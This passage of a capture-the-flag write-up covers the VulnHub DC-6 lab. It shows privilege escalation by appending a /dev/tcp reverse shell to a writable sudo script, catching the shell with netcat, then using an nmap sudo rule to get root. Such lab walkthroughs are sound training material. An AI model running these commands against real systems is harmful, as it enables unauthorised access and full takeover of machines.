    (jens) NOPASSWD: /home/jens/backups.sh
```
So we can execute the backup script as jens... If we are member of the devs group we can adjust this file. Let's check our user on the machine.
```
graham@dc-6:~$ whoami;id;hostname
graham
uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)
dc-6
graham@dc-6:~$ 

```
We are member of the `devs` group. Now let's append the file with a command to setup a reverse shell. 
```bash 
graham@dc-6:~$ echo 'sh -i >& /dev/tcp/10.0.2.15/53 0>&1' >> /home/jens/backups.sh
graham@dc-6:~$ cat /home/jens/backups.sh
#!/bin/bash
tar -czf backups.tar.gz /var/www/html
sh -i >& /dev/tcp/10.0.2.15/53 0>&1
graham@dc-6:~$ 

```
The reverse shell command has been added to the file.
Now start a netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ sudo nc -lvp 53               
[sudo] password for emvee: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53

```
Now run the backup script as jens.
```bash
graham@dc-6:~$ sudo -u jens /home/jens/backups.sh
tar: Removing leading `/' from member names
tar (child): backups.tar.gz: Cannot open: Permission denied
tar (child): Error is not recoverable: exiting now
tar: backups.tar.gz: Wrote only 4096 of 10240 bytes
tar: Child returned status 2
tar: Error is not recoverable: exiting now


```
Now let's check the netcat listener and check if the connection has been establishe who we are.
```
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ sudo nc -lvp 53               
[sudo] password for emvee: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.0.2.36.
Ncat: Connection from 10.0.2.36:42740.
$ whoami;id;hostname
jens
uid=1004(jens) gid=1004(jens) groups=1004(jens),1005(devs)
dc-6
$ 

```
Let's find out, if jens has sudo permissions as well.
```bash
$ sudo -l
Matching Defaults entries for jens on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
$ 

```
Well, jens has sudo permissions for the nmap binary... 
Let's check [GTFObins for sudo on nmap](https://gtfobins.github.io/gtfobins/nmap/#sudo).
```
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

## Privilege escalation
Now let's exploit this vulnerability.
```
$ TF=$(mktemp)
$ echo 'os.execute("/bin/sh")' > $TF
$ sudo nmap --script=$TF

Starting Nmap 7.40 ( https://nmap.org ) at 2023-03-28 05:43 AEST
NSE: Warning: Loading '/tmp/tmp.of41ugnlMk' -- the recommended file extension is '.nse'.

```
It looks like we gained a shell. Let's check if this shell is running as root.
```bash
whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root)
dc-6
cd /root
ls
theflag.txt
whoami;id;hostname;ifconfig;cat theflag.txt
root
uid=0(root) gid=0(root) groups=0(root)
dc-6
/bin/sh: 4: ifconfig: not found


Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b 
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"' 
   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8) 


Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.


```

